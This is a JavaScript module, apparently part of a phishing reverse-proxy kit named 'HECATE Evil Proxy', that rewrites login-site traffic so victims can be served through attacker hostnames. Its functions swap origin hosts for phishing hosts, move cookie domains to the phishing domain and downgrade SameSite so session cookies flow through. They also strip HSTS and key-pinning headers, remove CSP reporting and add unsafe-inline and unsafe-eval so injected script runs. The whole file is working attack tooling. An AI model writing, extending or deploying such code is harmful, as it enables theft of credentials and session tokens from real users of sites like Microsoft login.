'use strict';

/**
 * HECATE Evil Proxy — URL/Host Rewriter
 * Replaces all references to origin hostnames with phishing hostnames
 * in response bodies, headers, and cookies.
 *
 * Pure functions — no side effects, fully testable.
 *
 * Handles:
 *   - Absolute URLs (https://login.target.com/path)
 *   - Scheme-relative URLs (//login.target.com/path)
 *   - Host header values
 *   - Location redirect headers
 *   - Set-Cookie domain attributes
 *   - Content-Security-Policy headers (rewrite or strip)
 *   - CORS headers
 */

/**
 * Rewrite a response body — replace all origin hosts with phish hosts.
 * @param {string}  body
 * @param {Map}     reverseMap   - origin hostname → phish hostname
 * @param {string}  origScheme   - 'https' (usually)
 * @returns {string}
 */
function rewriteBody(body, reverseMap) {
  if (!body || !reverseMap.size) return body;

  let out = body;

  for (const [origHost, phishHost] of reverseMap) {
    // Replace https://origHost and http://origHost
    out = out.replaceAll(`https://${origHost}`, `https://${phishHost}`);
    out = out.replaceAll(`http://${origHost}`,  `https://${phishHost}`); // force https on phish side

    // Replace scheme-relative //origHost
    out = out.replaceAll(`//${origHost}`, `//${phishHost}`);

    // Replace bare hostname references in JSON/JS (e.g. "host":"login.target.com")
    // Use word boundary equivalent — match hostname surrounded by quotes or colons
    out = replaceHostInStrings(out, origHost, phishHost);
  }

  return out;
}

/**
 * Replace hostname in JSON string values and JS string literals.
 * Careful not to replace as a substring of a longer hostname.
 */
function replaceHostInStrings(body, origHost, phishHost) {
  // Escape for use in regex
  const escaped = origHost.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  // Match hostname bounded by: quote, space, comma, colon, slash
  const re = new RegExp(`(?<=['"\\s,:(/])${escaped}(?=['"\\s,:)/])`, 'g');
  return body.replace(re, phishHost);
}

/**
 * Rewrite response headers for the victim.
 * @param {object}  origHeaders  - headers from origin response
 * @param {Map}     reverseMap   - origin → phish
 * @param {string}  phishHost    - primary phishing hostname
 * @returns {object} cleaned headers safe to forward to victim
 */
function rewriteHeaders(origHeaders, reverseMap, phishHost) {
  const out = {};

  for (const [key, value] of Object.entries(origHeaders)) {
    const k = key.toLowerCase();

    // Strip headers that would expose origin or break proxy
    if (STRIP_HEADERS.has(k)) continue;

    // Location: redirect — rewrite the URL
    if (k === 'location') {
      out[key] = rewriteUrl(value, reverseMap);
      continue;
    }

    // Content-Security-Policy — strip or rewrite
    if (k === 'content-security-policy' || k === 'content-security-policy-report-only') {
      out[key] = rewriteCSP(value, reverseMap);
      continue;
    }

    // Access-Control-Allow-Origin — replace with phish host
    if (k === 'access-control-allow-origin') {
      out[key] = rewriteUrl(value, reverseMap);
      continue;
    }

    out[key] = value;
  }

  return out;
}

/**
 * Rewrite Set-Cookie headers to strip Secure flag domain constraints
 * and replace domain with phish domain.
 * Returns array of rewritten Set-Cookie strings.
 */
function rewriteSetCookie(setCookieHeaders, reverseMap) {
  if (!setCookieHeaders) return [];
  const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];

  // Build a base-domain map in addition to the full-host map.
  // Set-Cookie domains are usually .base.tld, but reverseMap keys are subdomain.base.tld.
  const baseDomainMap = new Map();
  for (const [origHost, phishHost] of reverseMap) {
    const origParts  = origHost.split('.');
    const phishParts = phishHost.split('.');
    // Extract base domain (last 2 parts): login.microsoftonline.com → microsoftonline.com
    if (origParts.length >= 2) {
      const origBase  = origParts.slice(-2).join('.');
      const phishBase = phishParts.slice(-2).join('.');
      if (!baseDomainMap.has(origBase)) baseDomainMap.set(origBase, phishBase);
    }
  }

  // Merged map: full hosts first, then base domains
  const mergedMap = new Map([...reverseMap, ...baseDomainMap]);

  return headers.map(header => {
    let out = header;

    for (const [origHost, phishHost] of mergedMap) {
      const escaped = origHost.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(`(domain=\\.?)${escaped}`, 'gi');
      out = out.replace(re, (_, prefix) => `${prefix}${phishHost}`);
    }

    // Remove SameSite=Strict/Lax so cookies flow through cross-origin proxy
    out = out.replace(/;\s*SameSite=(Strict|Lax)/gi, '; SameSite=None');

    // Ensure Secure is set (we're always HTTPS on phish side)
    if (!/;\s*Secure/i.test(out)) out += '; Secure';

    return out;
  });
}

/**
 * Rewrite a Content-Security-Policy header to allow phish hosts.
 * Strips report-uri directives and replaces origin hosts.
 */
function rewriteCSP(csp, reverseMap) {
  let out = csp;

  // Replace origin hosts with phish hosts in the policy
  for (const [origHost, phishHost] of reverseMap) {
    out = out.replaceAll(origHost, phishHost);
  }

  // Strip report-uri and report-to (would leak to origin)
  out = out.replace(/;\s*report-uri[^;]*/gi, '');
  out = out.replace(/;\s*report-to[^;]*/gi, '');

  // Add unsafe-inline and unsafe-eval so injected JS runs
  if (out.includes('script-src')) {
    out = out.replace(/(script-src[^;]*)/i, "$1 'unsafe-inline' 'unsafe-eval'");
  }

  return out;
}

/**
 * Rewrite a single URL string.
 */
function rewriteUrl(url, reverseMap) {
  if (!url) return url;
  let out = url;
  for (const [origHost, phishHost] of reverseMap) {
    out = out.replaceAll(origHost, phishHost);
  }
  return out;
}

// Headers to strip from origin responses before forwarding to victim
const STRIP_HEADERS = new Set([
  'strict-transport-security',  // let victim's browser accept our self-signed cert
  'public-key-pins',
  'public-key-pins-report-only',
  'expect-ct',
  'x-frame-options',            // allow framing if needed
  'transfer-encoding',          // we buffer the full body
  'content-encoding',           // we decode before rewriting
  'content-length',             // body size changes after rewriting
  'connection',
  'keep-alive',
  'proxy-authenticate',
  'proxy-connection',
  'te',
  'trailer',
  'upgrade',
]);

// Headers to strip from victim requests before forwarding to origin
const STRIP_REQUEST_HEADERS = new Set([
  'host',           // will be set to origin host
  'origin',         // rewrite separately
  'referer',        // rewrite separately
  'connection',
  'keep-alive',
  'proxy-authenticate',
  'proxy-authorization',
  'te',
  'trailers',
  'transfer-encoding',
  'upgrade',
]);

/**
 * Clean victim request headers before forwarding to origin.
 * @param {object} victimHeaders
 * @param {string} origHost       - origin hostname to use as Host:
 * @param {Map}    hostMap        - phish hostname → origin hostname
 */
function rewriteRequestHeaders(victimHeaders, origHost, hostMap) {
  const out = {};

  for (const [key, value] of Object.entries(victimHeaders)) {
    const k = key.toLowerCase();
    if (STRIP_REQUEST_HEADERS.has(k)) continue;

    // Referer: replace phish host with origin host
    if (k === 'referer' || k === 'origin') {
      out[key] = rewriteUrl(value, invertMap(hostMap));
      continue;
    }

    out[key] = value;
  }

  out['host'] = origHost;

  return out;
}

function invertMap(map) {
  const inv = new Map();
  for (const [k, v] of map) inv.set(v, k);
  return inv;
}

module.exports = {
  rewriteBody,
  rewriteHeaders,
  rewriteSetCookie,
  rewriteCSP,
  rewriteUrl,
  rewriteRequestHeaders,
  STRIP_HEADERS,
  STRIP_REQUEST_HEADERS,
};
